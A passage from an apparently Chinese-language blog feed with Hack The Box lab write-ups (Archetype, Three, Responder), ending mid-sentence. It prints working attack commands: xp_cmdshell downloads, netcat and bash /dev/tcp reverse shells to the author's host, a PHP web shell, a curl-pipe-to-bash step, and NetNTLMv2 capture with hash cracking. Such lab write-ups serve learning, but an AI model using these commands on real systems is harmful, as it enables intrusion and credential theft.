    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>通过这篇博客，你会了解到 SMB 协议、smbclient 命令、Microsoft SQL Server 、Impacket工具、xp_cmdshell命令、winPEAS工具、windows权限提升等知识，并对 nmap 和反弹 shell 的使用更加娴熟。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描目标主机端口：</p><p><img src="/../images/Pasted%20image%2020241217101741.png"></p><p>我们发现 SMB 端口是开放的，并且 Microsoft SQL Server 2017 正在端口 1433 上运行。</p><ul><li><strong>SMB</strong><ul><li>SMB（Server Message Block）是一种网络文件共享协议，常用于 Windows 操作系统中，用于允许应用程序读取和写入远程计算机上的文件以及请求计算机上的服务。SMB 协议不仅支持文件共享，还支持打印机共享、网络浏览等功能。</li><li>SMB 主要通过端口 <strong>445</strong> 进行通信。</li></ul></li></ul><p>使用 smbclient 与运行 SMB 协议的远程服务器进行交互：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">smbclient <span class="hljs-punctuation">-</span>N <span class="hljs-punctuation">-</span>L <span class="hljs-comment">//10.129.111.223</span><br><span class="hljs-meta">#-N : 以匿名身份登录，不需要密码。</span><br><span class="hljs-meta">#-L : 列出目标主机上的所有共享资源。</span><br><span class="hljs-meta"># `<span class="hljs-comment">//` 明确指出你要访问的是网络共享，而不是本地路径。</span></span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217105806.png"></p><p>尝试访问 backups：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smbclient</span> //<span class="hljs-number">10.129.111.223</span>/backups<br></code></pre></td></tr></table></figure><p>输入 dir 命令列出当前目录中的文件和文件夹：</p><p><img src="/../images/Pasted%20image%2020241217110650.png"></p><p> prod.dtsConfig 看起来像是一个配置文件。使用 get 命令将其下载到本地计算机：</p><p><img src="/../images/Pasted%20image%2020241217110859.png"></p><p>文件内容如下:</p><p><img src="/../images/Pasted%20image%2020241217111114.png"></p><p>我们发现了主机 ARCHETYPE 上用户 sql_svc 的密码。接下来尝试连接 MSSQL 服务器。</p><p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>工具中的 <strong>mssqlclient.py</strong> 可以提供此服务：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> mssqlclient.py ARCHETYPE/sql_svc@<span class="hljs-number">10.129.111.223</span> -windows-auth<br></code></pre></td></tr></table></figure><p>成功连接Microsoft SQL Server：</p><p><img src="/../images/Pasted%20image%2020241217123244.png"></p><p>有关 MSSQL Server 的渗透技巧可以看这篇文章： <a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></p><p>默认情况下，<code>xp_cmdshell</code> 被禁用，因为它允许执行操作系统命令，这可能带来安全风险。所以首先需要启用 <code>xp_cmdshell</code> ：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-keyword">Check</span> <span class="hljs-keyword">if</span> xp_cmdshell <span class="hljs-keyword">is</span> enabled<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> sys.configurations <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;<br><br># This turns <span class="hljs-keyword">on</span> advanced <span class="hljs-keyword">options</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> needed <span class="hljs-keyword">to</span> configure xp_cmdshell<br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span><br>RECONFIGURE<br><br><span class="hljs-meta">#This enables xp_cmdshell</span><br>sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span><br>RECONFIGURE<br></code></pre></td></tr></table></figure><p>尝试下 whoami 命令：</p><p><img src="/../images/Pasted%20image%2020241217125802.png"></p><p>因为 windows 操作系统没有内置 netcat ，所以我们要想办法让它安装一个 nc 。</p><p>首先在本机下载 nc64.exe，并在8000端口开启一个 http. server。注意把 nc64.exe放在执行 http. server 命令的目录下。</p><p><img src="/../images/Pasted%20image%2020241217132634.png"></p><p>接下来在 MSSQL Server 这边查看当前所处文件位置：</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">EXEC xp_cmdshell <span class="hljs-string">&quot;powershell -c pwd&quot;</span><br># `pwd` 是 PowerShell 的一个命令，而不是 cmd.exe 中的命令。<br># `powershell -c` 表示启动 PowerShel<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217135009.png"></p><p>作为用户 sql_svc ，没有权限在系统目录中上传文件。根据对 windows 系统的了解，可以在 <code>C:\Users\&lt;username&gt;\Downloads</code> 存放下载的文件。接下来在这个文件夹下，执行下载 nc64.exe 的命令：</p><figure class="highlight hsp"><table><tr><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.8:8000/nc64.exe&quot;</span><br></code></pre></td></tr></table></figure><p>由于对命令行工具的不熟悉，这里一开始用的是 curl 命令。后面无法执行反弹 shell ，发现Downloads 文件夹内没有nc64.exe。改为 wget 命令后成功下载。</p><ul><li>区别：<ul><li>**<code>wget</code>**：会根据 URL 自动保存文件。可以使用 <code>-O</code> 参数指定保存的文件名。</li><li>**<code>curl</code>**：默认输出内容到终端，如果要将下载的文件保存到本地，需要使用 <code>-O</code>  参数。</li><li>如果只是需要下载文件，**<code>wget</code>** 是更好的选择。</li><li>如果需要与服务器进行更复杂的交互，发送 HTTP 请求、处理表单数据、上传文件等，**<code>curl</code>** 更适合。</li></ul></li></ul><p>在 http.server 处看到目标服务器已经执行了这个命令。</p><p><img src="/../images/Pasted%20image%2020241217141433.png"></p><p>接下来就是常规的反弹 shell 了。</p><p>本机开放8888端口监听：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>目标服务器执行以下命令，通过 nc 将 cmd.exe 绑定到我们的监听端口：</p><figure class="highlight dos"><table><tr><td class="code"><pre><code class="hljs dos">EXEC xp_cmdshell &quot;powershell -c <span class="hljs-built_in">cd</span> C:\Users\sql_svc\Downloads; .\nc64.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">8</span> <span class="hljs-number">8888</span>&quot;<br></code></pre></td></tr></table></figure><p>在用户的 Desktop 文件找到 flag：</p><p><img src="/../images/Pasted%20image%2020241217152043.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来需要找到管理员的 flag，涉及到 Windows 权限提升，可以利用工具<a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe">winPEAS</a>，搜索在 Windows 主机上提升权限的可能路径。</p><p>将 winPEASx64.exe 下载到目标服务器：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 本机：</span><br><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br><br><span class="hljs-comment"># 目标服务器首先执行 PoweShell ，然后执行 wget 命令：</span><br><span class="hljs-attribute">powershell</span> <br><span class="hljs-attribute">Invoke</span>-WebRequest -Uri http://<span class="hljs-number">10.10.16.8:8000</span>/winPEASx64.exe -O <span class="hljs-string">&quot;winPEASx64.exe&quot;</span> -UseBasicParsing<br></code></pre></td></tr></table></figure><p>这里尝试了 wget ，curl 和PowerShell 自带的 <code>Invoke-WebRequest</code>都失败了，错误提示：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">wget : The response content cannot be parsed because <span class="hljs-keyword">the</span> Internet Explorer engine <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">or</span> Internet Explorer&#x27;s <span class="hljs-keyword">first</span>-<span class="hljs-built_in">launch</span> configuration <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> complete. Specify <span class="hljs-keyword">the</span> UseBasicParsing parameter <span class="hljs-keyword">and</span> <span class="hljs-keyword">try</span> again.<br></code></pre></td></tr></table></figure><p>这是因为在 PowerShell 中，默认使用 Internet Explorer（IE）作为内容解析引擎，但在某些环境中，IE 可能不可用或没有完全配置。这导致无法解析下载的内容。PowerShell 7 以上版本通常不再依赖于 IE 引擎。</p><p>解决办法是使用<code>-UseBasicParsing</code> 参数，让 PowerShell 使用基本的 HTML 解析方式，而不是依赖 IE 引擎。</p><p>执行 <strong>winPEASx64.exe</strong>：</p><figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">PS C:<span class="hljs-string">\Users\sql_svc\Downloads&gt;</span> .<span class="hljs-string">\winPEASx64.exe</span><br></code></pre></td></tr></table></figure><p>从输出的报告可以看到：</p><p><img src="/../images/Pasted%20image%2020241217175322.png"></p><p>当前用户拥有[ SeImpersonatePrivilege 权限](<a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege and SeCreateGlobalPrivilege - Windows Server | Microsoft Learn</a>)。这个权限可能被 [Juicy Potato](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">多汁土豆 |黑客技巧 — JuicyPotato | HackTricks</a>)利用。此处待日后展开讨论。</p><p>由于当前是一个普通用户账户，同时也是一个服务账户（为某些服务或应用程序运行而创建的账户），因此值得检查一下是否有经常访问的文件或执行的命令。</p><p>在 Windows 系统中，PowerShell 会记录用户执行的命令历史，类似于 Linux 中的 <code>.bash_history</code>。历史记录文件 <strong>ConsoleHost_history.txt</strong> 存储在 <code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\</code> 目录下。</p><p>查看这个文件，我们以明文形式获得了管理员用户的密码，该密码为 MEGACORP_4dm1n！！</p><p><img src="/../images/Pasted%20image%2020241217181120.png"></p><p>现在，我们可以再次使用 Impacket 工具中的 <strong>psexec.py</strong> 工具，以管理员身份获取 shell。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py administrator@<span class="hljs-number">10.129.111.223</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217182129.png"></p><p>在管理员的 Desktop 文件找到 flag：</p><p><img src="/../images/Pasted%20image%2020241217182813.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场是目前三个里面花的时间最长的，因为涉及到权限提升，不仅要找到用户 flag，还要找到管理员 flag 。实际上，这个过程中并没有涉及到 Windows 权限提升，而是通过记录 PoweShell 的文件找到了管理员的密码。关于权限提升，目前是一窍不通，以后遇到相关靶场再详细记录。通过三个靶场的练习，一些重复的知识我已经完全掌握了。这是一个良好的开端，日后会坚持刷题的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;通过这篇博客，你会了解到 SMB 协议、smbclient </summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Three</title>
    <link href="http://example.com/2024/12/14/Hack%20The%20Box-Three/"/>
    <id>http://example.com/2024/12/14/Hack%20The%20Box-Three/</id>
    <published>2024-12-14T04:52:06.000Z</published>
    <updated>2024-12-14T15:02:39.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在信息收集过程中，使用 gobuster 爆破子域名，发现该网站使用 AWS S3 bucket作为其云存储设备。利用配置不当的 S3 bucket，上传后门到网站根目录。在本地主机编写一个反弹shell脚本，启动一个 Web 服务器并开启一个监听端口。然后浏览器访问相应的 URL，让目标主机获取并执行反弹shell，最终获取目标主机的控制权。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>首先，nmap扫描开放端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -p- --min-rate <span class="hljs-number">1000</span> -sV <span class="hljs-number">10.129.160.174</span><br></code></pre></td></tr></table></figure><p>发现操作系统是Linux，有两个端口开放：22(ssh)和80(http):</p><p><img src="/../images/Pasted%20image%2020241214131020.png"></p><p>访问 <a href="http://10.129.27.203/">http://10.129.27.203</a> :</p><p><img src="/../images/Pasted%20image%2020241214131419.png"></p><p>contact页面发现一个子域名：</p><p><img src="/../images/Pasted%20image%2020241214131643.png"></p><p>通常，不同的子域名会对应不同的 IP 地址。但是也可以由同一台服务器处理多个子域名。这种情况下，服务器通过 HTTP 请求中的 <code>Host</code> 头来确定应该由哪个应用程序处理该请求。现在我们有域名thetoppers.htb ，接下来尝试寻找同一服务器的其他子域名。</p><p>主机在向 DNS 服务器查询前，会先检查本地 hosts 文件中是否已存在目标主机名的映射关系。所以我们首先需要通过 <code>/etc/hosts</code> 将 thetoppers.htb 手动映射到靶机的 IP 地址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.27.203 thetoppers.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br></code></pre></td></tr></table></figure><ul><li><strong>gobuster</strong><ul><li>基本用法：<ol><li>目录爆破：<code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code></li><li>子域名爆破：<code>gobuster dns -d example.com -w /path/to/wordlist.txt</code></li><li>虚拟主机枚举：<code>gobuster vhost -u http://example.com -w /path/to/wordlist.txt</code></li><li>S3 存储桶枚举：<code>gobuster s3 -w /path/to/wordlist.txt</code></li><li>自定义头部：<code>gobuster dir -u http://example.com -w /path/to/wordlist.txt -H &quot;Authorization: Bearer TOKEN&quot;</code></li></ol></li><li>dns 模式只能通过 DNS 记录来发现子域名，如果目标服务器没有配置 DNS 记录，或者目标子域没有公开的 DNS 记录，那么使用 dns 模式就无法发现这些子域。</li><li>vhost 模式通过尝试发送多个带有不同 Host 头的 HTTP 请求来模拟访问不同的虚拟主机，目的是查找由同一 IP 地址托管的多个虚拟主机（子域）。</li></ul></li></ul><p>接下来使用 gobuster 爆破子域名：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gobuster vhost -u http://thetoppers.htb -w Desktop/fuzzDicts/subdomainDicts/main.txt<br></code></pre></td></tr></table></figure><p>结果显示存在一个名为 s3.thetoppers.htb 的子域名，在 &#x2F;etc&#x2F;hosts 文件中为此子域名也添加一个条目：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.27.203 s3.thetoppers.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br></code></pre></td></tr></table></figure><p>访问这个子域名：</p><p><img src="/../images/Pasted%20image%2020241214175016.png"></p><p>Amazon S3 是一种基于云的对象存储服务（OSS），它使用 buckets 作为存储容器，类似于文件夹。使用场景包括备份和存储、媒体托管、软件交付、静态网站托管等。我们可以借助 <strong>awscli</strong> 与 S3 buckets进行交互。 </p><p>首先，设置其所有字段为任意值：</p><p><img src="/../images/Pasted%20image%2020241214175627.png"></p><p>使用 ls 命令列出服务器托管的所有 S3 buckets：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint=http</span>:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214175904.png"></p><p>然后查看指定 bucket 内的对象和公共前缀（PRE，类似文件夹）：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint=http</span>:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span> s3:<span class="hljs-string">//thetoppers.htb</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214180409.png"></p><p>在 thetoppers.htb 这个bucket内，我们看到了一个名为 &#x2F;images的文件夹，一个.htaccess(Apache 服务器的配置文件)和一个index.php，这符合网站根目录的文件结构。</p><p>awscli 允许上传文件到 S3 bucket，我们随意上传一个文件作测试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> Desktop/hash.txt s3://thetoppers.htb<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214183505.png"></p><p>浏览器访问 <a href="http://thetoppers.htb/hash.txt%EF%BC%9A">http://thetoppers.htb/hash.txt：</a></p><p><img src="/../images/Pasted%20image%2020241214185221.png"></p><p>发现上传到 S3 bucket的文件成功在浏览器上被显示出来了，由此分析该S3 bucket被用作网站的 <code>webroot</code>。根据这个漏洞，我们可以上传后门，获取网站的控制权。</p><p>我的Wappalyzer没分析出来网站用的什么编程语言，官方题解说是 PHP 。于是写一个 php 一句话木马：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>写入 shell.php 文件：</p><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; shell.php</span><br></code></pre></td></tr></table></figure><p>上传 shell.php:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> Desktop/shell.php s3://thetoppers.htb<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214184556.png"></p><p>这里在浏览器访问文件失败。查看 shell.php，发现文件内容变为：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>原因是 shell 对双引号内的内容会进行变量解析，而 <code>$_GET[&quot;cmd&quot;]</code> 被解释为一个尚未定义的变量（空值）。解决办法是将双引号改成单引号，单引号内部的内容不会被解析，因此可以正确保留 <code>$_GET[&quot;cmd&quot;]</code>：</p><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php</span><br></code></pre></td></tr></table></figure><p>尝试使用 URL 参数 cmd 执行 OS 命令 id :</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">http://thetoppers.htb/shell.php?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214190212.png"></p><p>证明已经成功上传后门。接下来就要想办法获取目标主机的控制权。</p><p>在实际场景中，很多内网机器并没有对外开放的端口供连接。而且目标主机通常位于受防火墙保护的内网环境中，无法直接通过正向连接访问。但目标机器可以主动发起出站连接，因为出站流量通常允许通过防火墙。这时就要用到反弹 shell 了。</p><p>创建一个 shell.sh，使用<a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a>一键生成（一开始用的nc，失败了）：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">10.10.16.8</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>本地主机开放8888端口监听：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>在本地主机 8000 端口上启动一个 Web 服务器：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>在浏览器上使用 curl 命令从本地主机获取 shell.sh，然后将其通过管道传输到 bash 以执行它：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://thetoppers.htb/<span class="hljs-built_in">shell</span>.php?cmd=curl <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.8</span>:<span class="hljs-number">8000</span>/<span class="hljs-built_in">shell</span>.sh|bash<br></code></pre></td></tr></table></figure><p>成功下载：</p><p><img src="/../images/Pasted%20image%2020241214223216.png"></p><p>监听端口显示连接成功，找到flag：</p><p><img src="/../images/Pasted%20image%2020241214223155.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>在这次靶场练习中，最大的收获是实际操作了以前学过的知识，比如上传后门和反弹shell。除此之外，又认识了一个渗透神器 gobuster，还了解了OSS，之前只听说过，但是没遇到过。在整个过程中，相对于以前的刷题过程，我多了些思考，并通过Chatgpt解决了疑惑，但是对一些命令还是不够熟练，以后再接再厉。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;在信息收集过程中，使用 gobuster 爆破子域名，发现该</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Responder</title>
    <link href="http://example.com/2024/12/13/Hack%20The%20Box-Responder/"/>
    <id>http://example.com/2024/12/13/Hack%20The%20Box-Responder/</id>
    <published>2024-12-13T09:56:20.000Z</published>
    <updated>2024-12-17T07:19:50.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>本篇博客演示了文件包含漏洞的利用，包括本地文件包含和远程文件包含，并介绍了 SMB 协议和 Windows 操作系统的 NTLM 协议。除此之外，使用 Responder 工具来获取 NetNTLMv2 哈希值，并使用 John The Ripper  测试数百万个可能的密码，找到正确的管理员密码。最后，使用 Evil-WinRM 获取目标主机权限。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>首先使用 Nmap 扫描目标主机的开放端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -p- --min-rate <span class="hljs-number">1000</span> -sV <span class="hljs-number">10.129.95.234</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213174908.png"></p><p>根据 Nmap 扫描的结果，发现该机器使用 Windows 操作系统。检测到两个端口处于打开状态。</p><p>打开 Firefox 并输入 <code>http://10.129.95.234</code>  时，网站重定向到 <code>http://unika.htb</code>。由于主机不知道如何解析 <code>unika.htb</code>（即无法将其转换为对应的 IP 地址），导致浏览器显示“无法找到该网站”的错误。</p><p><code>/etc/hosts</code> 文件用于将主机名解析为IP地址，因此我们需要在 &#x2F;etc&#x2F;hosts 文件中为该域添加一个条目，以使浏览器能够解析 unika.htb 的地址。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.95.234   unika.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br>//tee,同时写入到文件和屏幕<br>//-a,追加写入<br></code></pre></td></tr></table></figure><p>添加该条目后，访问 <code>unika.htb</code> 将直接解析为 <code>10.129.95.234</code>，无需通过外部 DNS 服务器。</p><p>刷新页面：</p><p><img src="/../images/Pasted%20image%2020241213180811.png"></p><p>编程语言是php：</p><p><img src="/../images/Pasted%20image%2020241213182532.png"></p><p>导航栏点击到 EN 时，URL 发生变化：</p><p><img src="/../images/Pasted%20image%2020241213180924.png"></p><p>页面是由 page 参数加载的，该参数可能受到<strong>文件包含</strong>漏洞的攻击。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>测试 page 参数，检查是否可以在服务器响应中包含目标系统上的文件。在Windows系统上，渗透测试可能尝试访问的最常见文件之一是 hosts 文件，路径为：  </p><figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript">WINDOWS\System32\drivers\etc\hosts<br></code></pre></td></tr></table></figure><p>使用目录穿越，逐步回退到根目录：</p><p><img src="/../images/Pasted%20image%2020241213182119.png"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>在 <code>php.ini</code> 配置文件中，<code>allow_url_include</code> 默认设置为 “Off”，表示 PHP 不会加载远程 HTTP 或 FTP URL，以防止远程文件包含攻击。然而，即使 <code>allow_url_include</code> 和 <code>allow_url_fopen</code> 设置为 “Off”，PHP 仍然可能允许 SMB URL 加载。</p><p>如果加载SMB URL ，Windows 将尝试进行身份验证，我们可以通过截取 NetNTLMv2获取用户密码。</p><ul><li><p><strong>SMB 协议</strong>:<br> SMB (Server Message Block) 协议是一个网络文件共享协议，主要用于在计算机之间共享文件、打印机和其他资源。它允许网络中的设备进行交互，例如访问文件系统、读取文件、写入文件以及与网络设备通信。</p></li><li><p><strong>NTLM:</strong></p><ul><li>NTLM (New Technology Lan Manager)是微软为 Windows 操作系统创建的一组身份验证协议。它是一种基于 Challenge-Response 的身份验证协议，用于在 Active Directory 域上验证客户端对资源的访问。</li><li>NTLM 身份验证的工作流程：<ol><li>客户端发送用户名和域名：<br> 客户端向服务器发送用户名和域名。</li><li>服务器生成 Challenge 字符串：<br> 服务器生成一个随机字符串，称为Challenge。</li><li>客户端加密 Challenge 字符串：<br> 客户端使用用户密码的 <strong>NTLM 哈希值</strong> 对 Challenge 字符串进行加密，并将结果发送回服务器。</li><li>服务器检索用户密码或等效值：<br> 服务器从安全账户数据库中检索用户密码或等效的哈希值。</li><li>服务器验证：<br> 服务器使用检索到的哈希值对 Challenge 字符串进行加密，得到的值与客户端返回的值进行比较。如果两者匹配，客户端身份验证成功。</li></ol></li></ul></li><li><p><strong>NetNTLMv2</strong>：<br>  它是 NTLMv2 的一个扩展版本，比 NTLMv1 提供了更强的安全性。它是一个包括 Challenge 和Response 的字符串，但由于人们常常通过类似对哈希值的攻击方法来破解它，所以它又被普遍称为 NetNTLMv2 哈希。</p></li></ul><p>通过使用<a href="https://github.com/lgandx/Responder">Responder</a>工具，攻击者可以伪装成 SMB 服务器来拦截和收集 NetNTLMv2 Challenge-Response 对。</p><p>验证 Responder.conf 中侦听 SMB 请求开关是否开启：</p><p><img src="/../images/Pasted%20image%2020241213193547.png"></p><p>接下来使用 python3 启动 Responder 监听：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> Responder.<span class="hljs-keyword">py</span> -I tun0<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213194021.png"></p><p>响应方服务器准备就绪后，通过设置 page 参数，告诉服务器包含来自 SMB 服务器的资源：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//u</span>nika.htb<span class="hljs-regexp">/?page=/</span><span class="hljs-regexp">/10.10.16.6/</span>whatever <span class="hljs-comment"># 随便写一个文件名</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213194801.png"></p><p>这时看 Responder，发现显示了Administrator 帐户的 NetNTLMv：</p><p><img src="/../images/Pasted%20image%2020241213195046.png"></p><p>将这个值存储到一个文件中：</p><p><img src="/../images/Pasted%20image%2020241213195358.png"></p><p>我们将哈希文件传递给<strong>John the Ripper</strong>（一个密码哈希破解程序），破解管理员帐户的密码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">john -w=<span class="hljs-regexp">/usr/</span>share/wordlists/rockyou.txt <span class="hljs-built_in">hash</span>.txt<br></code></pre></td></tr></table></figure><p>john 会尝试给定密码列表中的每个密码，并使用该密码加密 Response。如果结果与响应匹配，则找到了正确的密码：</p><p><img src="/../images/Pasted%20image%2020241213200448.png"></p><p>从 nmap 扫描结果中，我们发现 winrm （Windows Remote Management） 服务（5985）已启用。接下来连接到目标上的 